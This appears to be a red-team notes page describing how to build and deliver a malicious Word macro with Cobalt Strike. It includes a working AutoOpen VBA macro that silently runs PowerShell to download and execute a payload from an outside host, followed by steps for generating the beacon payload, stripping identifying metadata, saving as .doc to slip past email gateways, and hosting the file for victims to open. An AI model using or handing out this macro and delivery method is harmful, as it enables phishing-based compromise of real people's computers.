# [[VBA Macro]]  
___

## Description:
VBA is an implementation of Visual Basic that is very widely used with Microsoft Office applications - often used to enhance or augment functionality in Word and Excel for data processing etc.

## Installation
You can create a macro in a Word document by going toÂ **View > Macros > Create**. Â Change the "Macros in" field from "All active templates and documents" to "Document 1". Give the macro a name and clickÂ **Create**.

``` 

Sub AutoOpen()

  Dim proc As Object
  Set proc = GetObject("wscript.shell")
  proc.Create "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.5.120/a'))"

End Sub

```


In Cobalt Strike, go toÂ **Attacks > Web Drive-by > Scripted Web Delivery (S)**Â and generate a 64-bit PowerShell payload for your HTTP listener. The URI path can be anything, Type should be powershell. Copy and paste into your VBA (remember to add double quotes around command).


To prepare the document for delivery, go toÂ **File > Info > Inspect Document > Inspect Document**, which will bring up the Document Inspector. ClickÂ **Inspect**Â and thenÂ **Remove All**Â next toÂ **Document Properties and Personal Information**. This is to prevent the username on your system being embedded in the document.


Next, go toÂ **File > Save As**Â and browse toÂ **C:\Payloads**. Give it any filename, but in theÂ **Save as type**Â dropdown, change the format fromÂ **_.docx_**Â toÂ **Word 97-2003 (.doc)**. We do this because you can't save macro's inside aÂ `.docx`Â and there's a stigma around the macro-enabledÂ `.docm`Â extension (e.g. the thumbnail icon has a hugeÂ `!`Â and some web/email gateway block them entirely). I find that this legacyÂ `.doc`Â extension is the best compromise.


When an Office document with an embedded macro is opened for the first time, the user is presented with a security warning (assuming the environment isn't locked down to block macro's entirely). For the macro to execute, the userÂ _must_Â click onÂ **Enable Content**.


## Commands

host the HTA on the Team Server so we can simply send a link for them to download and execute. Go toÂ **Attacks > Web drive-by > Host File**. SelectÂ **demo.doc**Â and provide a URI to access it on. 



Run the macro on the victum machine to get a beacon.
